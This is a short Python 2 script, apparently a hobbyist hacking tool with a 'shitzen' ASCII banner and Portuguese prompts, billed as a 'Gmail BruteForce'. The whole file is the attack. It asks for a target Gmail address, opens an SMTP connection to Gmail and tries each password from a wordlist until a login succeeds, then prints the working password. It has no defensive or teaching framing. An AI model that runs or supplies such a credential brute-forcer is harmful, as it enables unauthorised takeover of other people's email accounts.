# -*- coding: utf-8 -*-
# codiname: shitzen

import smtplib

print("""

  ██████  ██░ ██  ██▓▄▄▄█████▓▒███████▒▓█████  ███▄    █ 
▒██    ▒ ▓██░ ██▒▓██▒▓  ██▒ ▓▒▒ ▒ ▒ ▄▀░▓█   ▀  ██ ▀█   █ 
░ ▓██▄   ▒██▀▀██░▒██▒▒ ▓██░ ▒░░ ▒ ▄▀▒░ ▒███   ▓██  ▀█ ██▒
  ▒   ██▒░▓█ ░██ ░██░░ ▓██▓ ░   ▄▀▒   ░▒▓█  ▄ ▓██▒  ▐▌██▒
▒██████▒▒░▓█▒░██▓░██░  ▒██▒ ░ ▒███████▒░▒████▒▒██░   ▓██░
▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓    ▒ ░░   ░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒░   ▒ ▒ 
░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░    ░    ░░▒ ▒ ░ ▒ ░ ░  ░░ ░░   ░ ▒░
░  ░  ░   ░  ░░ ░ ▒ ░  ░      ░ ░ ░ ░ ░   ░      ░   ░ ░ 
---------------------------------------------------------
01010011 01101000 01101001 01110100 01111010 01100101 01101110 

						Gmail BruteForce                             ░                        
	""")

gmail = raw_input("[+] Digite o email: ")
print("")

server = smtplib.SMTP('smtp.gmail.com:587')
server.ehlo()
server.starttls()

choice = str(input("[1] Wordlist personalizada [+] \n[2] Wordlist padrão [+] ? "))

if choice == "1":
	print("[+] Localize sua wordlist [+]")
	wordlist = raw_input(">> ")
	passfile = open(wordlist, "r")
	print("")

	for password in passfile:
		try:
			server.login(gmail, password)
			print("Email: {0} \nSenha correta: {1}").format(gmail, password)
			break;

		except smtplib.SMTPAuthenticationError:
			print("Email: {0}\nTentativa de senha: {1}").format(gmail, password)

if choice == "2":
	passfile = open("list.txt", "r")
	print("")

	for password in passfile:
		try:
			server.login(gmail, password)
			print("Email: {0} \nSenha correta: {1}").format(gmail, password)
			break;

		except smtplib.SMTPAuthenticationError:
			print("Email: {0}\nTentativa de senha: {1}").format(gmail, password)
